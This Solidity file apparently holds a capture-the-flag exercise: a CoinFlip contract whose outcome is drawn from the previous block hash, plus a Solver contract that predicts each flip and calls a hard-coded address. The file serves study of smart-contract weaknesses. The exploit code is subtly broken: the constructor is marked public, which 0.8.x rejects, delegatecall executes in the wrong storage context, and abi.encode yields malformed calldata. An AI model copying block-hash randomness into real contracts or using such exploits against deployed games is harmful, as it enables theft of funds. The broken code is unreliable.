// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

//import '@openzeppelin/contracts/math/SafeMath.sol';
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Solver {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address contractAddr = 0xECd6671D91e677522f698C59B7B7F69A0682D975;
    function solve() public returns (uint256) {
        bool whatToSend = (uint256(blockhash(block.number - 1)) / FACTOR) == 1;
        contractAddr.delegatecall(abi.encode(bytes4(keccak256("flip(bool)")),whatToSend));
    }
}

